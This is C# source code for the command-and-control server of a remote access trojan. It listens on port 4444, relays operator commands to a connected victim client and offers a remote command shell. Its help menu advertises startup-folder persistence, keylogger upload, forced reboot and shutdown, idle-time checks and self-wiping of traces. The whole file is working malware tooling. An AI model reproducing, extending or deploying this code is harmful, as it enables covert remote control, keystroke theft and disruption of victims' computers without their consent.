using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace Server
{
    class Server
    {
        static bool IsConnected = false;
        static TcpClient client;
        static TcpListener listen;
        static NetworkStream stream;
        static int data;
        static byte[] buffer;
        static byte[] buffercmd;
        static int datacmd;
        static string ch1;
        static string chcmd;
        static bool InShell = false;
        static void Main(string[] args)
        {
            checkConnection();
        }

        static void checkConnection()
        {
            //Checks if the server and client are connected if they arent then it will initate a listener and wait for a connection
            if (IsConnected == false)
            {
                int port = 4444;
                listen = new TcpListener(IPAddress.Any, port);
                Console.WriteLine("[Listening on port {0}...]", port);
                listen.Start();
                client = listen.AcceptTcpClient();
                Console.WriteLine("[Connection Established to: {0}]", ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());
                stream = client.GetStream();
                IsConnected = true;
                Thread.Sleep(500);
                SendMessage();
            }

        }

        static void SendMessage()
        {
            //Checks if it is in a shell so it can recieve the current working directory
            if (InShell == true)
            {
                buffer = new byte[client.ReceiveBufferSize];
                data = stream.Read(buffer, 0, client.ReceiveBufferSize);
                ch1 = Encoding.Unicode.GetString(buffer, 0, data);
                Console.Write(ch1 + "> ");
            }

            //If not the input will be "Console>"
            else
            {
                Console.Write("Console> ");
            }

            string ch = Console.ReadLine();

            //Attempts to write to the stream and if it fails it assumes the stream has been closed and thus reverts to awaiting a connection
            try
            {
                if (ch.Length <= 0)
                {
                    ch = "No_Message_Sent";
                    byte[] message = Encoding.Unicode.GetBytes(ch);
                    stream.Write(message, 0, message.Length);
                }
                else
                {
                    byte[] message = Encoding.Unicode.GetBytes(ch);
                    stream.Write(message, 0, message.Length);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine("Socket Write Failed: " + e.Message);
                IsConnected = false;
                listen.Stop();
                client.Close();
                stream.Close();
                checkConnection();
            }

            //Clears the window
            if(ch.ToString() == "clear")
            {
                Console.Clear();
                SendMessage();
            }

            //Will  only run the following commands if the program has not dropped into a shell
            if (InShell == false)
            {
                if (ch.ToString() == "KillConnection")
                {
                    Thread.Sleep(200);
                    client.Close();
                    stream.Close();
                    Environment.Exit(0);
                }

                if (ch.ToString() == "shell")
                {
                    InShell = true;
                    SendMessage();
                }

                if(ch.Contains("setVolume"))
                {
                    SendMessage();
                }
                if(ch.ToString() == "muteVolume")
                {
                    SendMessage();
                }
                if(ch.ToString() == "WipeConnectionData")
                {
                    Thread.Sleep(200);
                    client.Close();
                    stream.Close();
                    Environment.Exit(0);
                }

            }

            //When exit is passed it will determine if it is exiting the shell or exiting the server client
            if(ch.ToString() == "exit")
            {
                if (InShell == true)
                {
                    InShell = false;
                    SendMessage();
                }
                else
                {
                    Thread.Sleep(200);
                    client.Close();
                    stream.Close();
                    Environment.Exit(0);
                }
            }

            //Displays the help menu if not in shell
            #region Help Menu
            if (ch.ToString() == "help")
            {
                if(InShell == false) { 
                    Console.Write(string.Format("\nCore Commands" +
                                                "\n=============" +
                                                "\n\n" +
                                                "     Command               Description\n" +
                                                "     -------               -----------\n" +
                                                "     exit                  Closes just the server and the client reverts to listening for connections\n" +
                                                "     KillConnection        Kills the client and server client will not be accesible until client program is rebooted\n" +
                                                "     WipeConnectionData    Kills both the client and the server and deletes the client from the machine it is on (Includes persistance)\n" +
                                                "     shell                 Drops a command shell thus allowing execution of normal cmd commands\n" +
                                                "\n" +
                                                "\nAdditional Commands" +
                                                "\n===================" +
                                                "\n\n" +
                                                "     Command               Description\n" +
                                                "     -------               -----------\n" +
                                                "     getPersistence        Copies the program into the user's startup folder to allow for running on startup\n" +
                                                "     removePersistence     Deletes the copied program from startup\n" +
                                                "     uploadKeylogger       Uploads keylogger to startup and runs\n" +
                                                "     getIdleTime           Gets the amount of time since the user has used the computer\n" +
                                                "     reboot                Forcefully restarts  the client machine\n" +
                                                "     poweroff              Forcefully shuts down the client machine\n" +
                                                "     muteVolume            Mutes the system volume\n" +
                                                "     setVolume <amount>    Will set the system volume to a certain amount\n" +
                                                "\n"));
                    SendMessage();
                }
            }
            #endregion

            //If non of the specific commands above were passed then pass the command as usual to the client
            if (!ch.Contains("cd") && ch.ToString() != "exit")
            {
                buffercmd = new byte[client.ReceiveBufferSize];
                datacmd = stream.Read(buffercmd, 0, client.ReceiveBufferSize);
                chcmd = Encoding.Unicode.GetString(buffercmd, 0, datacmd);
                Console.WriteLine(chcmd);
                SendMessage();
            }

            else if (ch.ToString() != "exit")
            {
                SendMessage();
            }

        }

    
    }
}
